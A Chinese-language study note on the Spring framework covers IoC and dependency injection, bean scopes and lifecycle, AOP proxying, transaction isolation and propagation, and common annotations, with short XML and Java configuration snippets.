<p>IOC是控制反转，实际上获得依赖对象的过程被反转了，获得依赖对象的过程由自身管理变为了由IOC容器主动注入，即“<strong>依赖注入</strong>（Dependency Injection）”。所谓依赖注入，就是由IOC容器在运行期间，动态地将某种依赖关系注入到对象之中。</p>
<p><strong>依赖注入</strong>(DI)和<strong>控制反转</strong>(IOC)是从不同的角度的描述的同一件事情，就是指通过引入IOC容器，利用依赖关系注入的方式，实现对象之间的<strong>解耦</strong>。</p>
<p>IOC容器的工作模式看做是<strong>工厂模式</strong>的升华，可以把IOC容器看作是一个工厂，这个工厂里要生产的对象都在配置文件中给出定义，然后利用编程语言的的<strong>反射</strong>编程，根据配置文件中给出的类名生成相应的对象。从实现来看，IOC是把以前在工厂方法里写死的对象生成代码，改变为由配置文件来定义，也就是把工厂和对象生成这两者独立分隔开来，目的就是提高灵活性和可维护性</p>
<p>Spring 时代我们一般通过 XML 文件来配置 Bean，后来开发人员觉得 XML 文件来配置不太好，于是 SpringBoot 注解配置就慢慢开始流行起来。</p>
<h2 id="spring-ioc-工作过程" tabindex="-1"> Spring IOC 工作过程</h2>
<h3 id="spring-web项目ioc工作过程" tabindex="-1"> Spring Web项目IOC工作过程</h3>
<p>在Web项目使用Spring，是通过在web.xml里面配置：org.springframework.web.context.ContextLoaderListener 来初始化IOC容器的。ContextLoaderListener这个监听对象，监听的是ServletContext这个,当web容器初始化，ServletContext发生变化的时候，会触发相应的事件。</p>
<p>ContextLoaderListener继承了ContextLoader，并实现了ServletContextListener接口，在web容器初始化的时候，会触发ServletContextListener接口中的contextInitialized()方法，同理，在容器关闭的时候，会触发对应的contextDestroyed()方法。</p>
<h3 id="spring-非web项目ioc工作过程" tabindex="-1"> Spring 非Web项目IOC工作过程</h3>
<p><strong>Spring IoC的初始化过程：</strong> 读取XML资源，并解析，最终注册到Bean Factory中</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringIOC初始化过程.png" alt="Spring IoC的初始化过程" loading="lazy"></p>
<ol>
<li>准备：在调用ClassPathXmlApplicationContext后，先会将配置位置信息保存到configLocations，供后面解析使用，之后，会调用AbstractApplicationContext的refresh方法进行刷新</li>
<li>读取：创建处理每一个resource，处理XML每个元素，解析和注册bean。通过parseBeanDefinitionElement将XML的元素解析为BeanDefinition，然后存在BeanDefinitionHolder中，然后再利用BeanDefinitionHolder将BeanDefinition注册，实质就是把BeanDefinition的实例put进BeanFactory中</li>
<li>解析：处理每个Bean的元素，处理属性的值</li>
<li>注册：最核心的一句就是：this.beanDefinitionMap.put(beanName, beanDefinition)，也就是说注册的实质就是以beanName为key，以beanDefinition为value，将其put到HashMap中</li>
</ol>
<p>当完成初始化IOC容器后，如果bean没有设置lazy-init(延迟加载)属性，那么bean的实例就会在初始化IOC完成之后，及时地进行初始化。初始化时会先建立实例，然后根据配置利用反射对实例进行进一步操作，具体流程如下所示</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-DI过程.png" alt="Spring DI过程" loading="lazy"></p>
<ol>
<li>创建bean的实例</li>
<li>注入bean的属性</li>
</ol>
<p><a href="https://javadoop.com/post/spring-ioc" target="_blank" rel="noopener noreferrer">IoC源码阅读</a></p>
<h2 id="spring依赖注入" tabindex="-1"> Spring依赖注入</h2>
<ul>
<li>setter方式注入（设值注入）</li>
<li>构造器方式注入
<ul>
<li>Spring支持利用构造器注入参数实例化Bean方式。只要在Spring的配置文件中增加构造器参数constructor-arg</li>
<li>Spring就会自动的调用有参数的构造器创建bean对象实例, 整个过程无需程序编码只需要配置applicationContext.xml文件即可</li>
</ul>
</li>
<li>自动装配功能实现属性自动注入
<ul>
<li>Spring IoC容器可以自动装配（autowire）相互协作bean之间的关联关系，autowire可以针对单个bean进行设置，autowire的方便之处在于减少xml的注入配置。</li>
</ul>
</li>
</ul>
<p>当设值注入与构造注入同时存在时，先执行构造注入，再执行设值注入。</p>
<p>设置注入</p>
<ul>
<li>与传统的JavaBean的写法更相似，程序开发人员更容易理解、接受。通过setter方法设定依赖关系显得更加直观、自然。</li>
<li>对于复杂的依赖关系，如果采用构造注入，会导致构造器过于臃肿，难以阅读。Spring在创建Bean实例时，需要同时实例化其依赖的全部实例，因而导致性能下降。而是用设置注入可以避免这些问题。</li>
<li>尤其在某些属性可选的情况下，多参数的构造器更加笨重。</li>
</ul>
<p>构造器注入</p>
<ul>
<li>构造注入可以再构造器中决定依赖关系的注入顺序，有限依赖的优先注入。例如，组件中其它依赖关系的注入，常常需要依赖于Datasource的注入。采用构造注入，可以在代码中清晰地决定注入顺序。</li>
<li>对于依赖关系无需变化的Bean，构造注入更加有用。因为没有setter方法，所有的依赖关系全部在构造器内设定。因此，无需担心后续代码对依赖关系的破坏。</li>
<li>依赖关系只能在构造器中设定，则只有组建的创建者才能改变组建的依赖关系。队组建的调用者而言，组件内部的依赖关系完全透明，更符合高内聚的原则。</li>
</ul>
<h2 id="spring-bean" tabindex="-1"> Spring Bean</h2>
<h3 id="bean-作用域" tabindex="-1"> bean 作用域</h3>
<ul>
<li>singleton : 唯一 bean 实例，Spring 中的 bean 默认都是单例的。</li>
<li>prototype : 每次请求都会创建一个新的 bean 实例。即每次调用getBean() 想当于new XxxBean()</li>
<li>request : 每一次HTTP请求都会产生一个新的bean，该bean仅在当前HTTP request内有效。</li>
<li>session : 每一次HTTP请求都会产生一个新的 bean，该bean仅在当前 HTTP session 内有效。</li>
<li>globalSession： 全局session作用域，仅仅在基于portlet的web应用中才有意义，Spring5已经没有了。Portlet是能够生成语义代码(例如：HTML)片段的小型Java Web插件。它们基于portlet容器，可以像servlet一样处理HTTP请求。但是，与 servlet 不同，每个 portlet 都有不同的会话</li>
</ul>
<p>五种作用域中，request、session 和 globalSession 三种作用域仅在基于web的应用中使用，只能用在基于 web 的 Spring ApplicationContext 环境。</p>
<h4 id="singleton" tabindex="-1"> singleton</h4>
<p>唯一 bean 实例</p>
<p><strong>当一个 bean 的作用域为 singleton，那么Spring IoC容器中只会存在一个共享的 bean 实例，并且所有对 bean 的请求，只要 id 与该 bean 定义相匹配，则只会返回bean的同一实例。</strong> singleton 是单例类型(对应于单例模式)，就是在创建起容器时就同时自动创建了一个bean的对象，不管你是否使用，但我们可以指定Bean节点的 <code>lazy-init=”true”</code> 来延迟初始化bean，这时候，只有在第一次获取bean时才会初始化bean，即第一次请求该bean时才初始化。 每次获取到的对象都是同一个对象。注意，singleton 作用域是Spring中的缺省作用域。要在XML中将 bean 定义成 singleton ，可以这样配置：</p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>ServiceImpl<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>cn.service.ServiceImpl<span>"</span></span> <span>scope</span><span><span>=</span><span>"</span>singleton<span>"</span></span><span>></span></span>
</code></pre></div><p>也可以通过 <code>@Scope</code> 注解（它可以显示指定bean的作用范围。）的方式</p>
<div><pre><code><span>@Service</span>
<span>@Scope</span><span>(</span><span>"singleton"</span><span>)</span>
<span>public</span> <span>class</span> <span>ServiceImpl</span><span>{</span>

<span>}</span>
</code></pre></div><h4 id="prototype" tabindex="-1"> prototype</h4>
<p>每次请求都会创建一个新的 bean 实例</p>
<p><strong>当一个bean的作用域为 prototype，表示一个 bean 定义对应多个对象实例。prototype 作用域的 bean 会导致在每次对该 bean 请求</strong>（将其注入到另一个 bean 中，或者以程序的方式调用容器的 getBean() 方法）时都会创建一个新的 bean 实例。prototype 是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。根据经验，对有状态的 bean 应该使用 prototype 作用域，而对无状态的 bean 则应该使用 singleton 作用域。在 XML 中将 bean 定义成 prototype ，可以这样配置：</p>
<div><pre><code><span>&lt;</span>bean id<span>=</span><span>"account"</span> <span>class</span><span>=</span><span>"com.foo.DefaultAccount"</span> scope<span>=</span><span>"prototype"</span><span>/</span><span>></span>  
 或者
<span>&lt;</span>bean id<span>=</span><span>"account"</span> <span>class</span><span>=</span><span>"com.foo.DefaultAccount"</span> singleton<span>=</span><span>"false"</span><span>/</span><span>></span> 
</code></pre></div><p>同样可以通过 <code>@Scope</code> 注解的方式实现</p>
<h4 id="request" tabindex="-1"> request</h4>
<p><strong>request只适用于Web程序，每一次 HTTP 请求都会产生一个新的bean，同时该bean仅在当前HTTP request内有效，当请求结束后，该对象的生命周期即结束。</strong> 在 XML 中将 bean 定义成 request ，可以这样配置：</p>
<div><pre><code><span>&lt;</span>bean id<span>=</span><span>"loginAction"</span> <span>class</span><span>=</span><span><span>cn<span>.</span></span>LoginAction</span><span>" scope="</span>request"<span>/</span><span>></span>
</code></pre></div><h4 id="session" tabindex="-1"> session</h4>
<p><strong>session只适用于Web程序，session 作用域表示该针对每一次 HTTP 请求都会产生一个新的 bean，同时该 bean 仅在当前 HTTP session 内有效.与request作用域一样，可以根据需要放心的更改所创建实例的内部状态，而别的 HTTP session 中根据 userPreferences 创建的实例，将不会看到这些特定于某个 HTTP session 的状态变化。当HTTP session最终被废弃的时候，在该HTTP session作用域内的bean也会被废弃掉。</strong></p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>userPreferences<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>com.foo.UserPreferences<span>"</span></span> <span>scope</span><span><span>=</span><span>"</span>session<span>"</span></span><span>/></span></span>
</code></pre></div><h4 id="globalsession" tabindex="-1"> globalSession</h4>
<p>global session 作用域类似于标准的 HTTP session 作用域，不过仅仅在基于 portlet 的 web 应用中才有意义。Portlet 规范定义了全局 Session 的概念，它被所有构成某个 portlet web 应用的各种不同的 portlet所共享。在global session 作用域中定义的 bean 被限定于全局portlet Session的生命周期范围内。</p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>user<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>com.foo.Preferences <span>"</span></span><span>scope</span><span><span>=</span><span>"</span>globalSession<span>"</span></span><span>/></span></span>
</code></pre></div><h3 id="bean-生命周期" tabindex="-1"> bean 生命周期</h3>
<ul>
<li>Bean 容器找到配置文件中 Spring Bean 的定义。</li>
<li>Bean 容器利用 Java Reflection API 创建一个Bean的实例。</li>
<li>如果涉及到一些属性值 利用 <code>set()</code>方法设置一些属性值。</li>
<li>如果 Bean 实现了 <code>BeanNameAware</code> 接口，调用 <code>setBeanName()</code>方法，传入Bean的名字。</li>
<li>如果 Bean 实现了 <code>BeanClassLoaderAware</code> 接口，调用 <code>setBeanClassLoader()</code>方法，传入 <code>ClassLoader</code>对象的实例。</li>
<li>如果Bean实现了 <code>BeanFactoryAware</code> 接口，调用 <code>setBeanClassLoader()</code>方法，传入 <code>ClassLoader</code> 对象的实例。</li>
<li>与上面的类似，如果实现了其他 <code>*.Aware</code>接口，就调用相应的方法。</li>
<li>如果有和加载这个 Bean 的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessBeforeInitialization()</code> 方法</li>
<li>如果Bean实现了<code>InitializingBean</code>接口，执行<code>afterPropertiesSet()</code>方法。</li>
<li>如果 Bean 在配置文件中的定义包含  init-method 属性，执行指定的方法。</li>
<li>如果有和加载这个 Bean的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessAfterInitialization()</code> 方法</li>
<li>当要销毁 Bean 的时候，如果 Bean 实现了 <code>DisposableBean</code> 接口，执行 <code>destroy()</code> 方法。</li>
<li>当要销毁 Bean 的时候，如果 Bean 在配置文件中的定义包含 destroy-method 属性，执行指定的方法。</li>
</ul>
<p>图示：</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-bean-lifecycle.png" alt="Spring Bean 生命周期" loading="lazy"></p>
<p>与之比较类似的中文版本:</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-bean生命周期.png" alt="Spring Bean 生命周期" loading="lazy"></p>
<p><strong>Spring管理的单例/非单例对象</strong></p>
<p>Spring 容器可以管理 singleton 作用域下 bean 的生命周期，在此作用域下，Spring 能够精确地知道bean何时被创建，何时初始化完成，以及何时被销毁。而对于 prototype 作用域的bean，Spring只负责创建，当容器创建了 bean 的实例后，bean 的实例就交给了客户端的代码管理，Spring容器将不再跟踪其生命周期，并且不会管理那些被配置成prototype作用域的bean的生命周期。</p>
<h3 id="单例-bean-的线程安全" tabindex="-1"> 单例 bean 的线程安全</h3>
<p>大部分时候我们并没有在系统中使用多线程，所以很少有人会关注这个问题。单例 bean 存在线程问题，主要是因为当多个线程操作同一个对象的时候，对这个对象的非静态成员变量的写操作会存在线程安全问题。</p>
<p>常见的有两种解决办法：</p>
<ol>
<li>
<p>在Bean对象中尽量避免定义可变的成员变量（不太现实）。</p>
</li>
<li>
<p>在类中定义一个ThreadLocal成员变量，将需要的可变成员变量保存在 ThreadLocal 中（推荐的一种方式）。</p>
</li>
</ol>
<h1 id="spring-aop" tabindex="-1"> Spring AOP</h1>
<p>AOP(Aspect-Oriented Programming:面向切面编程)能够将那些与业务无关，<strong>却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来</strong>，便于<strong>减少系统的重复代码</strong>，<strong>降低模块间的耦合度</strong>，并<strong>有利于未来的可拓展性和可维护性</strong>。</p>
<p>AOP思想的实现一般都是基于 <strong>代理模式</strong> ，在JAVA中一般采用JDK动态代理模式，但是我们都知道，<strong>JDK动态代理模式只能代理接口而不能代理类</strong>。因此，Spring AOP 会这样子来进行切换，因为Spring AOP 同时支持 CGLIB、ASPECTJ、JDK动态代理。</p>
<ul>
<li>如果目标对象的实现类实现了接口，Spring AOP 将会采用 JDK 动态代理来生成 AOP 代理类；</li>
<li>如果目标对象的实现类没有实现接口，Spring AOP 将会采用 CGLIB 来生成 AOP 代理类;不过这个选择过程对开发者完全透明、开发者也无需关心。</li>
</ul>
<p><img src="@source/assets/cs-note/framework/spring/SpringAOP-Process.png" alt="SpringAOPProcess" loading="lazy"></p>
<p>当然你也可以使用 AspectJ ,Spring AOP 已经集成了AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。</p>
<p>使用 AOP 之后我们可以把一些通用功能抽象出来，在需要用到的地方直接使用即可，这样大大简化了代码量。我们需要增加新功能时也方便，这样也提高了系统扩展性。日志功能、事务管理等等场景都用到了 AOP</p>
<h2 id="spring-aop-和-aspectj-aop" tabindex="-1"> Spring AOP 和 AspectJ AOP</h2>
<p>Spring AOP 属于<strong>运行时增强</strong>，而 AspectJ 是<strong>编译时增强</strong>。 Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。</p>
<p>Spring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，</p>
<p>如果我们的切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 AspectJ ，它比Spring AOP 快很多。</p>
<h3 id="spring-aop-基于aspectj注解实现aop" tabindex="-1"> Spring AOP 基于AspectJ注解实现AOP</h3>
<p><strong>AspectJ是一个AOP框架，它能够对java代码进行AOP编译（一般在编译期进行），让java代码具有AspectJ的AOP功能（当然需要特殊的编译器）</strong>，可以这样说AspectJ是目前实现AOP框架中最成熟，功能最丰富的语言，更幸运的是，AspectJ与java程序完全兼容，几乎是无缝关联，因此对于有java编程基础的工程师，上手和使用都非常容易。Spring注意到AspectJ在AOP的实现方式上依赖于特殊编译器(ajc编译器)，因此Spring很机智回避了这点，转向采用动态代理技术的实现原理来构建Spring AOP的内部机制（动态织入），这是与AspectJ（静态织入）最根本的区别。<strong>Spring 只是使用了与 AspectJ 5 一样的注解，但仍然没有使用 AspectJ 的编译器，底层依是动态代理技术的实现，因此并不依赖于 AspectJ 的编译器</strong>。 Spring AOP虽然是使用了那一套注解，其实实现AOP的底层是使用了动态代理(JDK或者CGLib)来动态织入。</p>
<h4 id="jdk动态代理" tabindex="-1"> JDK动态代理</h4>
<p>JDK动态代理的核心是InvocationHandler接口和Proxy类，JDK 使用反射机制调用目标类的方法</p>
<p>JDK 动态代理机制只能对接口进行代理，其原理是动态生成一个代理类，这个代理类实现了目标对象的接口，目标对象和代理类都实现了接口，但是目标对象和代理类的 Class 对象是不一样的，所以两者是没法相互赋值的。</p>
<h4 id="cglib动态代理" tabindex="-1"> CGLIB动态代理</h4>
<p>CGLIB 是对目标对象本身进行代理，所以无论目标对象是否有接口，都可以对目标对象进行代理，其原理是使用字节码生成工具在内存生成一个继承目标对象的代理类，然后创建代理对象实例。</p>
<p>由于代理类的父类是目标对象，所以代理类是可以赋值给目标对象的，自然如果目标对象有接口，代理对象也是可以赋值给接口的。</p>
<p>CGLIB 动态代理中生成的代理类的字节码相比 JDK 来说更加复杂。</p>
<h2 id="aop-基本概念" tabindex="-1"> AOP 基本概念</h2>
<ul>
<li>通知(Adivce)：通知有5种类型
<ul>
<li>Before：在方法被调用之前调用</li>
<li>After：在方法完成后调用通知，无论方法是否执行成功</li>
<li>After-returning：在方法成功执行之后调用通知</li>
<li>After-throwing：在方法抛出异常后调用通知</li>
<li>Around：在被通知的方法调用之前后调用之后执行自定义的行为</li>
</ul>
</li>
<li>切点（Pointcut）：对应系统中的方法；这个方法是定义在切面中的方法，一般和通知一起使用，一起组成了切面。</li>
<li>连接点（Join point）：理论上, 程序执行过程中的任何时点都可以作为作为织入点, 而所有这些执行时点都是 Joint point；但 Spring AOP 目前仅支持方法执行 (method execution)也可以这样理解，连接点就是你准备在系统中执行切点和切入通知的地方（一般是一个方法，一个字段）</li>
<li>切面（Aspect）：切面是切点和通知的集合，一般单独作为一个类。通知和切点共同定义了关于切面的全部内容，它是什么时候，在何时和何处完成功能</li>
<li>引入（Introduction）：引用允许我们向现有的类添加新的方法或者属性</li>
<li>织入（Weaving）：组装方面来创建一个被通知对象。这可以在编译时完成（例如使用AspectJ编译器），也可以在运行时完成。Spring和其他纯Java AOP框架一样，在运行时完成织入。</li>
</ul>
<h2 id="spring-aop-实现方式" tabindex="-1"> Spring AOP 实现方式</h2>
<h3 id="基于-schema-spring-aop" tabindex="-1"> 基于 Schema(Spring AOP)</h3>
<p>Spring默认支持的AOP方式</p>
<p><strong>分类</strong></p>
<ul>
<li>编程式</li>
<li>声明式(基于配置)
<ul>
<li>手工代理</li>
<li>自动代理
<ul>
<li>扫描 Bean 名称</li>
<li>扫描切面配置</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li>基于XML的方式配置(在 <code>&lt;aop:config&gt;</code> 配置)</li>
<li>每个通知都需要实现接口或类</li>
</ul>
<h3 id="基于-aspectj-spring-aspectj" tabindex="-1"> 基于 AspectJ(Spring + AspectJ)</h3>
<p><strong>分类</strong></p>
<ul>
<li>基于配置(在 <code>&lt;aop:config&gt;</code> 的子标签 <code>&lt;aop:aspect&gt;</code>中配置)</li>
<li>基于注解</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li>每个通知不需要实现接口或类</li>
</ul>
<h3 id="实现对比" tabindex="-1"> 实现对比</h3>
<p><strong>织入的时期不同</strong></p>
<ul>
<li>Spring Aop采用的动态织入。动态织入又分静动两种，静则指织入过程只在第一次调用时执行；动则指根据代码动态运行的中间状态来决定如何操作，每次调用Target的时候都执行。</li>
<li>Aspectj是静态织入。静态织入：指在编译时期就织入，即：编译出来的class文件，字节码就已经被织入了。</li>
</ul>
<p><strong>使用对象不同</strong></p>
<ul>
<li>Spring AOP的通知是基于该对象是SpringBean对象才可以</li>
<li>AspectJ可以在任何Java对象上应用通知</li>
</ul>
<h1 id="spring-事务" tabindex="-1"> Spring 事务</h1>
<h2 id="spring事务管理方式" tabindex="-1"> Spring事务管理方式</h2>
<p>Spring 管理事务的方式</p>
<ol>
<li>编程式事务：在代码中硬编码。(不推荐使用)(通过Transaction Template手动管理事务)</li>
<li>声明式事务：在配置文件中配置（推荐使用）(实际是通过AOP实现)</li>
</ol>
<p><strong>声明式事务又分为两种：</strong></p>
<ol>
<li>基于XML的声明式事务：基于 <code>&lt;tx&gt;</code> 和 <code>&lt;aop&gt;</code> 命名空间的声明式事务管理： 目前推荐的方式，其最大特点是与 Spring AOP 结合紧密，可以充分利用切点表达式的强大支持，使得管理事务更加灵活。</li>
<li>基于注解的声明式事务：基于 @Transactional 的全注解方式： 将声明式事务管理简化到了极致。开发人员只需在配置文件中加上一行启用相关后处理 Bean 的配置，然后在需要实施事务管理的方法或者类上使用 @Transactional 指定事务规则即可实现事务管理，而且功能也不必其他方式逊色。</li>
</ol>
<h2 id="spring事务管理接口" tabindex="-1"> Spring事务管理接口</h2>
<ul>
<li>PlatformTransactionManager： （平台）事务管理器</li>
<li>TransactionDefinition： 事务定义信息(事务隔离级别、传播行为、超时、只读、回滚规则)</li>
<li>TransactionStatus： 事务运行状态</li>
</ul>
<p>所谓事务管理，其实就是“按照给定的事务规则来执行提交或者回滚操作”。</p>
<p><strong>PlatformTransactionManager</strong></p>
<ul>
<li>Spring并不直接管理事务，而是提供了多种事务管理器 ，他们将事务管理的职责委托给Hibernate或者JTA等持久化机制所提供的相关平台框架的事务来实现。 Spring事务管理器的接口是： org.springframework.transaction.PlatformTransactionManager ，通过这个接口，Spring为各个平台如JDBC、Hibernate等都提供了对应的事务管理器，但是具体的实现就是各个平台自己的事情了。</li>
<li>事务管理器接口 PlatformTransactionManager 通过 getTransaction(TransactionDefinition definition) 方法来得到一个事务，这个方法里面的参数是 TransactionDefinition类 ，这个类就定义了一些基本的事务属性。</li>
</ul>
<p><strong>TransactionDefinition</strong> 接口中定义了5个方法以及一些表示事务属性的常量比如隔离级别、传播行为等等的常量。</p>
<p><strong>TransactionStatus</strong> 接口用来记录事务的状态 该接口定义了一组方法,用来获取或判断事务的相应状态信息</p>
<ul>
<li>PlatformTransactionManager.getTransaction(...) 方法返回一个 TransactionStatus 对象。返回的TransactionStatus 对象可能代表一个新的或已经存在的事务（如果在当前调用堆栈有一个符合条件的事务）。</li>
</ul>
<h2 id="事务属性" tabindex="-1"> 事务属性</h2>
<p><img src="@source/assets/cs-note/framework/spring/Spring事务属性.png" alt="Spring事务属性" loading="lazy"></p>
<h3 id="事务隔离级别" tabindex="-1"> 事务隔离级别</h3>
<p>在典型的应用程序中，多个事务并发运行，经常会操作相同的数据来完成各自的任务（多个用户对统一数据进行操作）,并发虽然是必须的，但可能会导致一下的问题。</p>
<p><strong>TransactionDefinition 接口中定义了五个表示隔离级别的常量：</strong></p>
<ul>
<li><strong>TransactionDefinition.ISOLATION_DEFAULT:</strong>          使用后端数据库默认的隔离级别，Mysql 默认采用的 REPEATABLE_READ隔离级别 Oracle 默认采用的 READ_COMMITTED隔离级别.</li>
<li><strong>TransactionDefinition.ISOLATION_READ_UNCOMMITTED:</strong> 最低的隔离级别，允许读取尚未提交的数据变更，<strong>可能会导致脏读、幻读或不可重复读</strong></li>
<li><strong>TransactionDefinition.ISOLATION_READ_COMMITTED:</strong>   允许读取并发事务已经提交的数据，<strong>可以阻止脏读，但是幻读或不可重复读仍有可能发生</strong></li>
<li><strong>TransactionDefinition.ISOLATION_REPEATABLE_READ:</strong>  对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，<strong>可以阻止脏读和不可重复读，但幻读仍有可能发生。</strong></li>
<li><strong>TransactionDefinition.ISOLATION_SERIALIZABLE:</strong>     最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，<strong>该级别可以防止脏读、不可重复读以及幻读</strong>。但是这将严重影响程序的性能。通常情况下也不会用到该级别。</li>
</ul>
<h3 id="事务传播行为" tabindex="-1"> 事务传播行为</h3>
<p>当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。</p>
<p>Spring 事务中的事务传播行为：</p>
<p><strong>支持当前事务的情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRED：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。</li>
<li><strong>TransactionDefinition.PROPAGATION_SUPPORTS：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。</li>
<li><strong>TransactionDefinition.PROPAGATION_MANDATORY：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。（mandatory：强制性）</li>
</ul>
<p><strong>不支持当前事务的情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRES_NEW：</strong> 创建一个新的事务，如果当前存在事务，则把当前事务挂起。</li>
<li><strong>TransactionDefinition.PROPAGATION_NOT_SUPPORTED：</strong> 以非事务方式运行，如果当前存在事务，则把当前事务挂起。</li>
<li><strong>TransactionDefinition.PROPAGATION_NEVER：</strong> 以非事务方式运行，如果当前存在事务，则抛出异常。</li>
</ul>
<p><strong>其他情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_NESTED：</strong> 如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于TransactionDefinition.PROPAGATION_REQUIRED。</li>
</ul>
<h3 id="事务超时属性" tabindex="-1"> 事务超时属性</h3>
<p>所谓事务超时，就是指一个事务所允许执行的最长时间，如果超过该时间限制但事务还没有完成，则自动回滚事务。在 TransactionDefinition 中以 int 的值来表示超时时间，其单位是秒。</p>
<h3 id="事务只读属性" tabindex="-1"> 事务只读属性</h3>
<p>事务的只读属性是指，对事务性资源进行只读操作或者是读写操作。所谓事务性资源就是指那些被事务管理的资源，比如数据源、 JMS 资源，以及自定义的事务性资源等等。如果确定只对事务性资源进行只读操作，那么我们可以将事务标志为只读的，以提高事务处理的性能。</p>
<h3 id="事务回滚规则" tabindex="-1"> 事务回滚规则</h3>
<p>这些规则定义了哪些异常会导致事务回滚而哪些不会。默认情况下，事务只有遇到运行期异常时才会回滚，而在遇到检查型异常时不会回滚（这一行为与EJB的回滚行为是一致的）。但是你可以声明事务在遇到特定的检查型异常时像遇到运行期异常那样回滚。同样，你还可以声明事务遇到特定的异常不回滚，即使这些异常是运行期异常。</p>
<p>注解 <strong>@Transactional(rollbackFor = Exception.class)</strong></p>
<p>Exception分为运行时异常RuntimeException和非运行时异常。事务管理对于企业应用来说是至关重要的，即使出现异常情况，它也可以保证数据的一致性。</p>
<p>当<code>@Transactional</code>注解作用于类上时，该类的所有 public 方法将都具有该类型的事务属性，同时，我们也可以在方法级别使用该标注来覆盖类级别的定义。如果类或者方法加了这个注解，那么这个类里面的方法抛出异常，就会回滚，数据库里面的数据也会回滚。</p>
<p>在<code>@Transactional</code>注解中如果不配置<code>rollbackFor</code>属性,那么事物只会在遇到<code>RuntimeException</code>的时候才会回滚,加上<code>rollbackFor=Exception.class</code>,可以让事物在遇到非运行时异常时也回滚。</p>
<h1 id="spring-注解" tabindex="-1"> Spring 注解</h1>
<h2 id="声明bean" tabindex="-1"> 声明Bean</h2>
<p>@<strong>Component</strong></p>
<p>可以使用此注解描述Spring中的Bean，但它只是一个泛化的概念，仅仅表现一个组件（Bean），并且可以作用在任何层次。</p>
<p>@<strong>Repository</strong></p>
<p>用于将数据访问层(DAO层)的类标识为Spring中的Bean，其功能与@Component相同。</p>
<p>@<strong>Service</strong></p>
<p>通常作用在业务层(Service层)用于将业务层的类标识为Spring中的Bean，其功能与@Component相同。</p>
<p>@<strong>Controller</strong></p>
<p>通常作用在控制层(如SpringMVC的Controler)用于将控制层的类表示为为Spring中的Bean，其功能与@Component相同。</p>
<h2 id="注入bean" tabindex="-1"> 注入Bean</h2>
<p>@<strong>Autowired</strong></p>
<p>用于对Bean的属性变量、属性的setter方法及构造方法进行标注，配合相应的注解处理器完成Bean的自动配置工作。默认按照Bean的类型(byType)进行装配。</p>
<p>@<strong>Resource</strong></p>
<p>其作用与@Autowired一样。 其区别在于@Autowired默认按照Bean类型装配，而@Resource默认按照Bean实例名称进行装配。@Resource中有两个实例类型。name和type。Spring 将name属性解析为Bean实例名称(id)，type 属性解析为Bean实例类型，如果指定name属性，则接实例名称进行装配；如果指定type属性，则按Bean类型进行装配；如果都不指定，则先按Bean实例名称装配，如果不能匹配，再按照Bean类型进行装配:如无法匹配，则抛出NoSuchBeanDefinitionException异常。</p>
<h2 id="配置类相关注解" tabindex="-1"> 配置类相关注解</h2>
<p>@<strong>Configuration</strong></p>
<p>声明当前类为配置类，其中内部组合了@Component注解，表明这个类是一个bean，相当于xml形式的Spring配置；</p>
<p>使用@Configuration，所有标记为@Bean的方法将被包装成一个CGLIB包装器，它的工作方式就好像是这个方法的第一个调用，那么原始方法的主体将被执行，最终的对象将在spring上下文中注册。所有进一步的调用只返回从上下文检索的bean。</p>
<p>@<strong>Bean</strong></p>
<p>注解在方法上，声明当前方法的返回值为一个bean</p>
<p>@<strong>ComponentScan</strong></p>
<p>用于对Component进行扫描</p>
<p>@<strong>WishlyConfiguration</strong></p>
<p>为@Configuration与@ComponentScan的组合注解，可以替代这两个注解</p>
<p>@<strong>ImportResource</strong></p>
<p>导⼊XML中的bean的元数据</p>
<h2 id="切面-aop-相关注解" tabindex="-1"> 切面(AOP)相关注解</h2>
<p>Spring支持AspectJ的注解式切面编程。</p>
<p>在java配置类中使用@EnableAspectJAutoProxy注解开启Spring对AspectJ代理的支持</p>
<p>@<strong>Aspect</strong></p>
<p>声明一个切面</p>
<p>@<strong>PointCut</strong></p>
<p>声明切点</p>
<p>@<strong>Before</strong></p>
<p>在方法执行之前执行（方法上）</p>
<p>@<strong>After</strong></p>
<p>在方法执行之后执行（方法上）</p>
<p>@<strong>AfterReturning</strong></p>
<p>后置通知,必须切点正确执行</p>
<p>@<strong>AfterThrowing</strong></p>
<p>异常通知</p>
